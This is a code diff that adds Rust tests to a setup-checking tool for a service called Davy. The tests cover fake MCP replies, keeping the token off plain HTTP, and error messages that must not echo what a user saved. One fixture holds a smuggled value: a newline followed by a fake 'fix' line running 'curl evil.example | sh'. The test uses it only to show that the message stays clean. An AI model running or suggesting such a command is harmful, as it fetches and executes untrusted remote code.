@@ -206,6 +206,31 @@ async fn an_mcp_that_answers_without_the_token_is_not_davy() {
 }
 
 #[tokio::test]
+async fn a_reply_that_only_mentions_server_info_is_not_an_mcp_reply() {
+    let fake = listen(Router::new().route(
+        "/mcp",
+        any(|headers: axum::http::HeaderMap| async move {
+            if headers.contains_key(axum::http::header::AUTHORIZATION) {
+                (axum::http::StatusCode::OK, r#"<p>"serverInfo"</p>"#)
+            } else {
+                (axum::http::StatusCode::UNAUTHORIZED, "")
+            }
+        }),
+    ))
+    .await;
+    let data = install(&fake, None);
+    assert_eq!(
+        find(&run(&data).await, "mcp"),
+        &not_ok(
+            "mcp",
+            Status::Fail,
+            format!("{fake}mcp answers HTTP 200 to the token without an MCP reply"),
+            "check that the proxy forwards /mcp to Davy unchanged, then read the server log"
+        )
+    );
+}
+
+#[tokio::test]
 async fn the_token_never_goes_out_over_plain_http() {
     let client = reqwest::Client::new();
     let url = Url::parse("http://davy.example.com/").unwrap();
@@ -220,6 +245,32 @@ async fn the_token_never_goes_out_over_plain_http() {
     );
 }
 
+#[tokio::test]
+async fn saved_settings_must_hold_an_address_and_their_errors_echo_nothing() {
+    let data = dir();
+    std::fs::create_dir_all(&data).unwrap();
+    let save = |public_url: &str, listen: &str| {
+        let json =
+            serde_json::json!({"public_url": public_url, "listen": listen, "mail_from": null});
+        std::fs::write(data.join("setup.json"), json.to_string()).unwrap();
+    };
+    save(
+        "https://davy.example.com/",
+        "x\nfail  fix: curl evil.example | sh",
+    );
+    let settings = find(&run(&data).await, "settings").detail.clone();
+    assert_eq!(
+        settings,
+        format!(
+            "the listen address in {}/setup.json is not an address and port, run `davy setup` again",
+            data.display()
+        )
+    );
+    save("https//user:secret@davy", "127.0.0.1:8000");
+    let settings = find(&run(&data).await, "settings").detail.clone();
+    assert!(!settings.contains("secret"), "{settings}");
+}
+
 #[test]
 fn plain_http_fails_unless_it_stays_on_this_machine() {
     let check = |url: &str| tls(&Url::parse(url).unwrap(), "127.0.0.1:8000", "/var/lib/davy");
@@ -227,7 +278,8 @@ fn plain_http_fails_unless_it_stays_on_this_machine() {
         check("https://davy.example.com/"),
         ok("tls", "https://davy.example.com/ uses https")
     );
-    assert_eq!(check("http://localhost:8000/").status, Status::Ok);
+    assert_eq!(check("http://localhost:8000/").status, Status::Fail);
+    assert_eq!(check("http://evil.localhost:8000/").status, Status::Fail);
     assert_eq!(check("http://[::1]:8000/").status, Status::Ok);
     assert_eq!(
         check("http://davy.example.com/"),
